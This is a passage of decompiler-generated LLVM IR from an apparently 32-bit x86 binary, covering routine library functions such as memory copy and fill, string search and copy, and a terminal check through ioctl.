  %v0_804e82f = phi i32 [ %v0_804e826, %dec_label_pc_804e81e ], [ %v0_804e82f.pre, %dec_label_pc_804e823 ]
  %v1_804e82f = add i32 %v0_804e82f, 32
  %v2_804e82f = inttoptr i32 %v1_804e82f to i32*
  %storemerge1 = load i32, i32* %v2_804e82f, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804e832 = icmp eq i32 %storemerge1, 0
  %v1_804e834 = icmp eq i1 %v1_804e832, false
  br i1 %v1_804e834, label %dec_label_pc_804e81e, label %dec_label_pc_804e836

dec_label_pc_804e836:                             ; preds = %dec_label_pc_804e82f, %dec_label_pc_804e832.preheader
  %v2_804e836 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e836, i32* %eax.global-to-local, align 4
  %v2_804e837 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e837, i32* @ebx, align 4
  store i32 %v0_804e7b2, i32* @esi, align 4
  ret i32 %v2_804e836

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i8 64, { 1, 0 }
  uselistorder i16* @global_var_80556e0.46, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_804e79b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e82f, { 1, 0 }
  uselistorder label %dec_label_pc_804e81e, { 1, 0 }
  uselistorder label %dec_label_pc_804e7fc, { 1, 0 }
  uselistorder label %dec_label_pc_804e7d5, { 1, 0 }
}

define i32 @function_804e83c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e83c:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804e83c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e844 = add i32 %arg1, 8
  %v2_804e844 = inttoptr i32 %v1_804e844 to i32*
  %v3_804e844 = load i32, i32* %v2_804e844, align 4
  store i32 %v3_804e844, i32* %edx.global-to-local, align 4
  %v1_804e847 = add i32 %arg1, 16
  %v2_804e847 = inttoptr i32 %v1_804e847 to i32*
  %v3_804e847 = load i32, i32* %v2_804e847, align 4
  %v2_804e84a = sub i32 %v3_804e847, %v3_804e844
  %v12_804e84a = icmp eq i32 %v2_804e84a, 0
  store i32 %v2_804e84a, i32* %eax.global-to-local, align 4
  br i1 %v12_804e84a, label %dec_label_pc_804e85d, label %dec_label_pc_804e84e

dec_label_pc_804e84e:                             ; preds = %dec_label_pc_804e83c
  store i32 %v3_804e844, i32* %v2_804e847, align 4
  %v0_804e851 = load i32, i32* @ecx, align 4
  %v0_804e852 = load i32, i32* %eax.global-to-local, align 4
  %v0_804e853 = load i32, i32* %edx.global-to-local, align 4
  %v0_804e854 = load i32, i32* @ebx, align 4
  %v4_804e855 = inttoptr i32 %v0_804e854 to i16*
  %v5_804e855 = call i32 @function_80519a8(i16* %v4_804e855, i32 %v0_804e853, i32 %v0_804e852, i32 %v0_804e851)
  store i32 %v5_804e855, i32* %eax.global-to-local, align 4
  %v0_804e85d.pre = load i32, i32* @ebx, align 4
  %v2_804e863.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e85d

dec_label_pc_804e85d:                             ; preds = %dec_label_pc_804e83c, %dec_label_pc_804e84e
  %v2_804e863 = phi i32 [ %tmp11, %dec_label_pc_804e83c ], [ %v2_804e863.pre, %dec_label_pc_804e84e ]
  %v0_804e85d = phi i32 [ %arg1, %dec_label_pc_804e83c ], [ %v0_804e85d.pre, %dec_label_pc_804e84e ]
  %v1_804e85d = add i32 %v0_804e85d, 16
  %v2_804e85d = inttoptr i32 %v1_804e85d to i32*
  %v3_804e85d = load i32, i32* %v2_804e85d, align 4
  store i32 %v3_804e85d, i32* %eax.global-to-local, align 4
  %v2_804e860 = add i32 %v0_804e85d, 8
  %v3_804e860 = inttoptr i32 %v2_804e860 to i32*
  %v4_804e860 = load i32, i32* %v3_804e860, align 4
  %v5_804e860 = sub i32 %v3_804e85d, %v4_804e860
  store i32 %v5_804e860, i32* %eax.global-to-local, align 4
  store i32 %v2_804e863, i32* %edx.global-to-local, align 4
  store i32 %v0_804e83c, i32* @ebx, align 4
  ret i32 %v5_804e860

; uselistorder directives
  uselistorder i32 %v0_804e85d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e85d, { 1, 0 }
}

define i32 @function_804f670(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f670:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f671 = load i32, i32* @esi, align 4
  store i32 %v0_804f671, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804f672 = sdiv i32 %sext, 16777216
  store i32 %v4_804f672, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f67a = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f67a, i32* %edi.global-to-local, align 4
  %v2_804f680 = udiv i32 %v4_804f672, 4
  %v3_804f683 = inttoptr i32 %arg2 to i8*
  %v4_804f683 = bitcast i16* %arg1 to i8*
  %v5_804f683 = call i8* @_memcpy(i8* %v4_804f683, i8* %v3_804f683, i32 %v2_804f680)
  %v6_804f683 = ptrtoint i8* %v5_804f683 to i32
  store i32 %v6_804f683, i32* @ecx, align 4
  %v0_804f685 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f685 = and i32 %v0_804f685, 2
  %v3_804f685 = icmp eq i32 %v2_804f685, 0
  br i1 %v3_804f685, label %dec_label_pc_804f68b, label %dec_label_pc_804f689

dec_label_pc_804f689:                             ; preds = %dec_label_pc_804f670
  %v0_804f689 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f689 = inttoptr i32 %v0_804f689 to i16*
  %v2_804f689 = load i16, i16* %v1_804f689, align 2
  %v3_804f689 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f689 = inttoptr i32 %v3_804f689 to i16*
  store i16 %v2_804f689, i16* %v4_804f689, align 2
  %v5_804f689 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f689 = load i32, i32* %esi.global-to-local, align 4
  %v9_804f689 = add i32 %v5_804f689, 2
  %v10_804f689 = add i32 %v6_804f689, 2
  store i32 %v9_804f689, i32* %edi.global-to-local, align 4
  store i32 %v10_804f689, i32* %esi.global-to-local, align 4
  %v0_804f68b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f68b

dec_label_pc_804f68b:                             ; preds = %dec_label_pc_804f670, %dec_label_pc_804f689
  %v0_804f68b = phi i32 [ %v0_804f685, %dec_label_pc_804f670 ], [ %v0_804f68b.pre, %dec_label_pc_804f689 ]
  %v2_804f68b = urem i32 %v0_804f68b, 2
  %v3_804f68b = icmp eq i32 %v2_804f68b, 0
  br i1 %v3_804f68b, label %dec_label_pc_804f690, label %dec_label_pc_804f68f

dec_label_pc_804f68f:                             ; preds = %dec_label_pc_804f68b
  %v0_804f68f = load i32, i32* %esi.global-to-local, align 4
  %v1_804f68f = inttoptr i32 %v0_804f68f to i8*
  %v2_804f68f = load i8, i8* %v1_804f68f, align 1
  %v3_804f68f = load i32, i32* %edi.global-to-local, align 4
  %v4_804f68f = inttoptr i32 %v3_804f68f to i8*
  store i8 %v2_804f68f, i8* %v4_804f68f, align 1
  %v5_804f68f = load i32, i32* %edi.global-to-local, align 4
  %v6_804f68f = load i32, i32* %esi.global-to-local, align 4
  %v9_804f68f = add i32 %v5_804f68f, 1
  %v10_804f68f = add i32 %v6_804f68f, 1
  store i32 %v9_804f68f, i32* %edi.global-to-local, align 4
  store i32 %v10_804f68f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f690

dec_label_pc_804f690:                             ; preds = %dec_label_pc_804f68b, %dec_label_pc_804f68f
  store i32 %v4_804f67a, i32* %eax.global-to-local, align 4
  %v2_804f694 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f694, i32* @esi, align 4
  ret i32 %v4_804f67a

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804f690, { 1, 0 }
  uselistorder label %dec_label_pc_804f68b, { 1, 0 }
}

define i32 @function_804f698(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f698:
  %v0_804f698 = load i32, i32* @edi, align 4
  %v4_804f6a1 = ptrtoint i8* %arg1 to i32
  %v5_804f6a5 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_804f698, i32* @edi, align 4
  ret i32 %v4_804f6a1

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_804f6b0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f6b0:
  %v4_804f6b1 = ptrtoint i8* %arg1 to i32
  %v2_804f6b9 = mul i32 %arg2, 256
  %v3_804f6b9 = and i32 %v2_804f6b9, 65280
  %v4_804f6b9 = and i32 %arg2, -65281
  %v5_804f6b9 = or i32 %v3_804f6b9, %v4_804f6b9
  br label %dec_label_pc_804f6bb

dec_label_pc_804f6bb:                             ; preds = %dec_label_pc_804f6c0, %dec_label_pc_804f6b0
  %v4_804f6bb = phi i32 [ %v6_804f6bb, %dec_label_pc_804f6c0 ], [ %v5_804f6b9, %dec_label_pc_804f6b0 ]
  %v7_804f6bb = phi i32 [ %v10_804f6bb, %dec_label_pc_804f6c0 ], [ %v4_804f6b1, %dec_label_pc_804f6b0 ]
  %v1_804f6bb = inttoptr i32 %v7_804f6bb to i8*
  %v2_804f6bb = load i8, i8* %v1_804f6bb, align 1
  %v10_804f6bb = add i32 %v7_804f6bb, 1
  %v3_804f6bc = udiv i32 %v4_804f6bb, 256
  %v4_804f6bc = trunc i32 %v3_804f6bc to i8
  %v16_804f6bc = icmp eq i8 %v2_804f6bb, %v4_804f6bc
  br i1 %v16_804f6bc, label %dec_label_pc_804f6c9, label %dec_label_pc_804f6c0

dec_label_pc_804f6c0:                             ; preds = %dec_label_pc_804f6bb
  %v3_804f6bb = zext i8 %v2_804f6bb to i32
  %v5_804f6bb = and i32 %v4_804f6bb, -256
  %v6_804f6bb = or i32 %v3_804f6bb, %v5_804f6bb
  %v4_804f6c0 = icmp eq i8 %v2_804f6bb, 0
  %v1_804f6c2 = icmp eq i1 %v4_804f6c0, false
  br i1 %v1_804f6c2, label %dec_label_pc_804f6bb, label %dec_label_pc_804f6c4

dec_label_pc_804f6c4:                             ; preds = %dec_label_pc_804f6c0
  br label %dec_label_pc_804f6c9

dec_label_pc_804f6c9:                             ; preds = %dec_label_pc_804f6bb, %dec_label_pc_804f6c4
  %v0_804f6c9 = phi i32 [ 1, %dec_label_pc_804f6c4 ], [ %v10_804f6bb, %dec_label_pc_804f6bb ]
  %v1_804f6cb = add i32 %v0_804f6c9, -1
  ret i32 %v1_804f6cb

; uselistorder directives
  uselistorder i8 %v2_804f6bb, { 1, 2, 0 }
  uselistorder i32 %v4_804f6bb, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f6c9, { 1, 0 }
}

define i32 @function_804f6d0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f6d0:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f6d1 = load i32, i32* @esi, align 4
  store i32 %v0_804f6d1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f6d9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f6d9, i32* %edi.global-to-local, align 4
  %v4_804f6dd.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f6dd

dec_label_pc_804f6dd:                             ; preds = %dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge, %dec_label_pc_804f6d0
  %v2_804f6de = phi i32 [ %v7_804f6de, %dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge ], [ %v4_804f6d9, %dec_label_pc_804f6d0 ]
  %v4_804f6dd = phi i32 [ %v0_804f6df, %dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge ], [ %v4_804f6dd.pre, %dec_label_pc_804f6d0 ]
  %v7_804f6dd = phi i32 [ %v0_804f6dd.pre, %dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge ], [ %arg2, %dec_label_pc_804f6d0 ]
  %v1_804f6dd = inttoptr i32 %v7_804f6dd to i8*
  %v2_804f6dd = load i8, i8* %v1_804f6dd, align 1
  %v3_804f6dd = zext i8 %v2_804f6dd to i32
  %v5_804f6dd = and i32 %v4_804f6dd, -256
  %v6_804f6dd = or i32 %v3_804f6dd, %v5_804f6dd
  store i32 %v6_804f6dd, i32* %eax.global-to-local, align 4
  %v10_804f6dd = add i32 %v7_804f6dd, 1
  store i32 %v10_804f6dd, i32* %esi.global-to-local, align 4
  %v3_804f6de = inttoptr i32 %v2_804f6de to i8*
  store i8 %v2_804f6dd, i8* %v3_804f6de, align 1
  %v4_804f6de = load i32, i32* %edi.global-to-local, align 4
  %v7_804f6de = add i32 %v4_804f6de, 1
  store i32 %v7_804f6de, i32* %edi.global-to-local, align 4
  %v0_804f6df = load i32, i32* %eax.global-to-local, align 4
  %v3_804f6df = trunc i32 %v0_804f6df to i8
  %v4_804f6df = icmp eq i8 %v3_804f6df, 0
  %v1_804f6e1 = icmp eq i1 %v4_804f6df, false
  br i1 %v1_804f6e1, label %dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge, label %dec_label_pc_804f6e3

dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge: ; preds = %dec_label_pc_804f6dd
  %v0_804f6dd.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f6dd

dec_label_pc_804f6e3:                             ; preds = %dec_label_pc_804f6dd
  store i32 %v4_804f6d9, i32* %eax.global-to-local, align 4
  %v2_804f6e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f6e8, i32* %esi.global-to-local, align 4
  ret i32 %v4_804f6d9

; uselistorder directives
  uselistorder i32 %v0_804f6df, { 1, 0 }
  uselistorder i32 %v7_804f6de, { 1, 0 }
  uselistorder i32 %v4_804f6d9, { 1, 2, 0, 3 }
}

define i32 @function_804f744(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_804f744:
  %v0_804f747 = load i32, i32* @ebx, align 4
  %v4_804f74b = ptrtoint i8* %arg2 to i32
  %v2_804f753 = load i8, i8* %arg2, align 1
  %v1_804f756 = icmp eq i8 %v2_804f753, 0
  br i1 %v1_804f756, label %dec_label_pc_804f80a, label %dec_label_pc_804f761

dec_label_pc_804f761:                             ; preds = %dec_label_pc_804f744
  %v1_804f761 = add i32 %arg1, -1
  br label %dec_label_pc_804f762

dec_label_pc_804f762:                             ; preds = %dec_label_pc_804f76e, %dec_label_pc_804f761
  %v0_804f762 = phi i32 [ %v1_804f762, %dec_label_pc_804f76e ], [ %v1_804f761, %dec_label_pc_804f761 ]
  %v1_804f762 = add i32 %v0_804f762, 1
  %v1_804f763 = inttoptr i32 %v1_804f762 to i8*
  %v2_804f763 = load i8, i8* %v1_804f763, align 1
  %v1_804f766 = icmp eq i8 %v2_804f763, 0
  br i1 %v1_804f766, label %dec_label_pc_804f808, label %dec_label_pc_804f76e

dec_label_pc_804f76e:                             ; preds = %dec_label_pc_804f762
  %v14_804f76e = icmp eq i8 %v2_804f763, %v2_804f753
  %v1_804f771 = icmp eq i1 %v14_804f76e, false
  br i1 %v1_804f771, label %dec_label_pc_804f762, label %dec_label_pc_804f773

dec_label_pc_804f773:                             ; preds = %dec_label_pc_804f76e
  %v1_804f773 = add i32 %v4_804f74b, 1
  %v2_804f77a = inttoptr i32 %v1_804f773 to i8*
  %v3_804f77a = load i8, i8* %v2_804f77a, align 1
  %v1_804f77e = icmp eq i8 %v3_804f77a, 0
  br i1 %v1_804f77e, label %dec_label_pc_804f80a, label %dec_label_pc_804f786

dec_label_pc_804f786:                             ; preds = %dec_label_pc_804f773
  %v1_804f786 = add i32 %v0_804f762, 2
  %v1_804f7d0 = add i32 %v4_804f74b, 2
  %v2_804f7d0 = inttoptr i32 %v1_804f7d0 to i8*
  br label %dec_label_pc_804f7bc

dec_label_pc_804f791:                             ; preds = %dec_label_pc_804f800
  %v2_804f791 = inttoptr i32 %v0_804f7c2 to i8*
  %v3_804f791 = load i8, i8* %v2_804f791, align 1
  br label %dec_label_pc_804f7af.preheader

dec_label_pc_804f7af.preheader:                   ; preds = %dec_label_pc_804f791, %dec_label_pc_804f7bc
  %v0_804f7af8.in = phi i8 [ %v3_804f791, %dec_label_pc_804f791 ], [ %v4_804f786.sink.in, %dec_label_pc_804f7bc ]
  %v14_804f7af16 = icmp eq i8 %v0_804f7af8.in, %v2_804f753
  %v1_804f7b218 = icmp eq i1 %v14_804f7af16, false
  br i1 %v1_804f7b218, label %dec_label_pc_804f79a, label %dec_label_pc_804f7b4

dec_label_pc_804f79a:                             ; preds = %dec_label_pc_804f7af.preheader, %dec_label_pc_804f7ab
  %v0_804f79e = phi i32 [ %v1_804f7ab, %dec_label_pc_804f7ab ], [ %v0_804f7c2, %dec_label_pc_804f7af.preheader ]
  %v0_804f79a.in = phi i8 [ %v2_804f7ac, %dec_label_pc_804f7ab ], [ %v0_804f7af8.in, %dec_label_pc_804f7af.preheader ]
  %v1_804f79a = icmp eq i8 %v0_804f79a.in, 0
  br i1 %v1_804f79a, label %dec_label_pc_804f808, label %dec_label_pc_804f79e

dec_label_pc_804f79e:                             ; preds = %dec_label_pc_804f79a
  %v1_804f79e = add i32 %v0_804f79e, 1
  %v1_804f79f = inttoptr i32 %v1_804f79e to i8*
  %v2_804f79f = load i8, i8* %v1_804f79f, align 1
  %v14_804f7a2 = icmp eq i8 %v2_804f79f, %v2_804f753
  br i1 %v14_804f7a2, label %dec_label_pc_804f7b4, label %dec_label_pc_804f7a7

dec_label_pc_804f7a7:                             ; preds = %dec_label_pc_804f79e
  %v1_804f7a7 = icmp eq i8 %v2_804f79f, 0
  br i1 %v1_804f7a7, label %dec_label_pc_804f808, label %dec_label_pc_804f7ab

dec_label_pc_804f7ab:                             ; preds = %dec_label_pc_804f7a7
  %v1_804f7ab = add i32 %v0_804f79e, 2
  %v1_804f7ac = inttoptr i32 %v1_804f7ab to i8*
  %v2_804f7ac = load i8, i8* %v1_804f7ac, align 1
  %v14_804f7af = icmp eq i8 %v2_804f7ac, %v2_804f753
  %v1_804f7b2 = icmp eq i1 %v14_804f7af, false
  br i1 %v1_804f7b2, label %dec_label_pc_804f79a, label %dec_label_pc_804f7b4

dec_label_pc_804f7b4:                             ; preds = %dec_label_pc_804f7ab, %dec_label_pc_804f79e, %dec_label_pc_804f7af.preheader
  %v0_804f7b4 = phi i32 [ %v0_804f7c2, %dec_label_pc_804f7af.preheader ], [ %v1_804f7ab, %dec_label_pc_804f7ab ], [ %v1_804f79e, %dec_label_pc_804f79e ]
  %v1_804f7b4 = add i32 %v0_804f7b4, 1
  br label %dec_label_pc_804f7bc

dec_label_pc_804f7bc:                             ; preds = %dec_label_pc_804f786, %dec_label_pc_804f7b4
  %v0_804f7c2 = phi i32 [ %v1_804f786, %dec_label_pc_804f786 ], [ %v1_804f7b4, %dec_label_pc_804f7b4 ]
  %v4_804f786.sink.in.in.in = phi i32 [ %v1_804f786, %dec_label_pc_804f786 ], [ %v1_804f7b4, %dec_label_pc_804f7b4 ]
  %v4_804f786.sink.in.in = inttoptr i32 %v4_804f786.sink.in.in.in to i8*
  %v4_804f786.sink.in = load i8, i8* %v4_804f786.sink.in.in, align 1
  %storemerge4 = icmp eq i8 %v4_804f786.sink.in, %v3_804f77a
  %v1_804f7bc = icmp eq i1 %storemerge4, false
  br i1 %v1_804f7bc, label %dec_label_pc_804f7af.preheader, label %dec_label_pc_804f7be

dec_label_pc_804f7be:                             ; preds = %dec_label_pc_804f7bc
  %v1_804f7c2 = add i32 %v0_804f7c2, 1
  %v1_804f7c9 = add i32 %v0_804f7c2, -1
  %v2_804f7cc = inttoptr i32 %v1_804f7c2 to i8*
  %v3_804f7cc = load i8, i8* %v2_804f7cc, align 1
  %v4_804f7cc = zext i8 %v3_804f7cc to i32
  %v3_804f7d0 = load i8, i8* %v2_804f7d0, align 1
  %v4_804f7d0 = zext i8 %v3_804f7d0 to i32
  %v12_804f7d5 = icmp eq i8 %v3_804f7cc, %v3_804f7d0
  %v1_804f7d7 = icmp eq i1 %v12_804f7d5, false
  br i1 %v1_804f7d7, label %dec_label_pc_804f800, label %dec_label_pc_804f7d9

dec_label_pc_804f7d9:                             ; preds = %dec_label_pc_804f7be, %dec_label_pc_804f7ed
  %v0_804f7f0 = phi i32 [ %v1_804f7f0, %dec_label_pc_804f7ed ], [ %v1_804f7d0, %dec_label_pc_804f7be ]
  %v0_804f7ed = phi i32 [ %v1_804f7ed, %dec_label_pc_804f7ed ], [ %v1_804f7c2, %dec_label_pc_804f7be ]
  %v0_804f7d9 = phi i32 [ %v3_804f7f3, %dec_label_pc_804f7ed ], [ %v4_804f7cc, %dec_label_pc_804f7be ]
  %v1_804f7d9 = icmp eq i32 %v0_804f7d9, 0
  br i1 %v1_804f7d9, label %dec_label_pc_804f80a, label %dec_label_pc_804f7dd

dec_label_pc_804f7dd:                             ; preds = %dec_label_pc_804f7d9
  %v1_804f7dd = add i32 %v0_804f7ed, 1
  %v2_804f7dd = inttoptr i32 %v1_804f7dd to i8*
  %v3_804f7dd = load i8, i8* %v2_804f7dd, align 1
  %v1_804f7e1 = add i32 %v0_804f7f0, 1
  %v2_804f7e1 = inttoptr i32 %v1_804f7e1 to i8*
  %v3_804f7e1 = load i8, i8* %v2_804f7e1, align 1
  %v4_804f7e1 = zext i8 %v3_804f7e1 to i32
  %v12_804f7e5 = icmp eq i8 %v3_804f7dd, %v3_804f7e1
  %v1_804f7e7 = icmp eq i1 %v12_804f7e5, false
  br i1 %v1_804f7e7, label %dec_label_pc_804f800, label %dec_label_pc_804f7e9

dec_label_pc_804f7e9:                             ; preds = %dec_label_pc_804f7dd
  %v1_804f7e9 = icmp eq i8 %v3_804f7e1, 0
  br i1 %v1_804f7e9, label %dec_label_pc_804f80a, label %dec_label_pc_804f7ed

dec_label_pc_804f7ed:                             ; preds = %dec_label_pc_804f7e9
  %v1_804f7ed = add i32 %v0_804f7ed, 2
  %v1_804f7f0 = add i32 %v0_804f7f0, 2
  %v1_804f7f3 = inttoptr i32 %v1_804f7f0 to i8*
  %v2_804f7f3 = load i8, i8* %v1_804f7f3, align 1
  %v3_804f7f3 = zext i8 %v2_804f7f3 to i32
  %v1_804f7f7 = inttoptr i32 %v1_804f7ed to i8*
  %v2_804f7f7 = load i8, i8* %v1_804f7f7, align 1
  %v12_804f7fa = icmp eq i8 %v2_804f7f7, %v2_804f7f3
  br i1 %v12_804f7fa, label %dec_label_pc_804f7d9, label %dec_label_pc_804f7fe

dec_label_pc_804f7fe:                             ; preds = %dec_label_pc_804f7ed
  br label %dec_label_pc_804f800

dec_label_pc_804f800:                             ; preds = %dec_label_pc_804f7dd, %dec_label_pc_804f7be, %dec_label_pc_804f7fe
  %v0_804f800 = phi i32 [ %v4_804f7d0, %dec_label_pc_804f7be ], [ %v3_804f7f3, %dec_label_pc_804f7fe ], [ %v4_804f7e1, %dec_label_pc_804f7dd ]
  %v1_804f800 = icmp eq i32 %v0_804f800, 0
  %v1_804f802 = icmp eq i1 %v1_804f800, false
  br i1 %v1_804f802, label %dec_label_pc_804f791, label %dec_label_pc_804f80a

dec_label_pc_804f808:                             ; preds = %dec_label_pc_804f762, %dec_label_pc_804f7a7, %dec_label_pc_804f79a
  br label %dec_label_pc_804f80a

dec_label_pc_804f80a:                             ; preds = %dec_label_pc_804f800, %dec_label_pc_804f7d9, %dec_label_pc_804f7e9, %dec_label_pc_804f744, %dec_label_pc_804f773, %dec_label_pc_804f808
  %storemerge2 = phi i32 [ 0, %dec_label_pc_804f808 ], [ %v1_804f762, %dec_label_pc_804f773 ], [ %arg1, %dec_label_pc_804f744 ], [ %v1_804f7c9, %dec_label_pc_804f7e9 ], [ %v1_804f7c9, %dec_label_pc_804f7d9 ], [ %v1_804f7c9, %dec_label_pc_804f800 ]
  store i32 %v0_804f747, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_804f7f0, { 1, 0 }
  uselistorder i32 %v1_804f7ed, { 1, 0 }
  uselistorder i8 %v3_804f7e1, { 1, 0, 2 }
  uselistorder i32 %v0_804f7c2, { 4, 3, 2, 0, 1 }
  uselistorder i8 %v2_804f7ac, { 1, 0 }
  uselistorder i32 %v1_804f7ab, { 0, 2, 1 }
  uselistorder i8 %v2_804f79f, { 1, 0 }
  uselistorder i32 %v1_804f762, { 0, 2, 1 }
  uselistorder i8 %v2_804f753, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f80a, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_804f808, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f800, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f7d9, { 1, 0 }
  uselistorder label %dec_label_pc_804f7bc, { 1, 0 }
  uselistorder label %dec_label_pc_804f79a, { 1, 0 }
  uselistorder label %dec_label_pc_804f7af.preheader, { 1, 0 }
}

define i32 @function_804f908(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f908:
  %stack_var_-60 = alloca i32, align 4
  %v3_804f914 = call i32 @function_804f928(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804f919 = icmp eq i32 %v3_804f914, 0
  %v1_804f91b = zext i1 %v1_804f919 to i32
  ret i32 %v1_804f91b
}

define i32 @function_804f928(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804f928:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f928 = load i32, i32* @esi, align 4
  %v0_804f929 = load i32, i32* @ebx, align 4
  store i32 %v0_804f929, i32* %stack_var_-8, align 4
  %v2_804f92d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f92d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804f93f = call i32 @function_804e3dc(i32 %arg1, i32 21505, i32 %v2_804f92d)
  store i32 %v3_804f93f, i32* %eax.global-to-local, align 4
  %v1_804f947 = icmp eq i32 %v3_804f93f, 0
  store i32 %v3_804f93f, i32* @esi, align 4
  %v1_804f94b = icmp eq i1 %v1_804f947, false
  br i1 %v1_804f94b, label %dec_label_pc_804f990, label %dec_label_pc_804f94d

dec_label_pc_804f94d:                             ; preds = %dec_label_pc_804f928
  %v3_804f94d = load i32, i32* %stack_var_-44, align 4
  %v1_804f951 = load i32, i32* @ebx, align 4
  %v2_804f951 = inttoptr i32 %v1_804f951 to i32*
  store i32 %v3_804f94d, i32* %v2_804f951, align 4
  %v1_804f957 = load i32, i32* @ebx, align 4
  %v2_804f957 = add i32 %v1_804f957, 4
  %v3_804f957 = inttoptr i32 %v2_804f957 to i32*
  %v1_804f95e = load i32, i32* @ebx, align 4
  %v2_804f95e = add i32 %v1_804f95e, 8
  %v3_804f95e = inttoptr i32 %v2_804f95e to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804f965 = load i32, i32* @ebx, align 4
  %v2_804f965 = add i32 %v1_804f965, 12
  %v3_804f965 = inttoptr i32 %v2_804f965 to i32*
  store i32 %tmp3, i32* %v3_804f965, align 4
  %v4_804f968 = zext i8 %tmp to i32
  %v5_804f968 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f968 = and i32 %v5_804f968, -256
  %v7_804f968 = or i32 %v6_804f968, %v4_804f968
  store i32 %v7_804f968, i32* %eax.global-to-local, align 4
  %v2_804f96c = load i32, i32* @ebx, align 4
  %v3_804f96c = add i32 %v2_804f96c, 16
  %v4_804f96c = inttoptr i32 %v3_804f96c to i8*
  store i8 %tmp, i8* %v4_804f96c, align 1
  %v0_804f96f = load i32, i32* %eax.global-to-local, align 4
  %v2_804f972 = ptrtoint i32* %stack_var_-27 to i32
  %v0_804f977 = load i32, i32* @ebx, align 4
  %v1_804f977 = add i32 %v0_804f977, 17
  store i32 %v1_804f977, i32* %eax.global-to-local, align 4
  %v4_804f97b = call i32 @function_80522f4(i32 %v1_804f977, i32 %v2_804f972, i32 19, i32 %v0_804f96f)
  store i32 %v4_804f97b, i32* %eax.global-to-local, align 4
  %v3_804f988 = inttoptr i32 %v4_804f97b to i8*
  %v4_804f988 = call i32 @function_804f698(i8* %v3_804f988, i32 0, i32 13)
  store i32 %v4_804f988, i32* %eax.global-to-local, align 4
  %v0_804f993.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f990

dec_label_pc_804f990:                             ; preds = %dec_label_pc_804f928, %dec_label_pc_804f94d
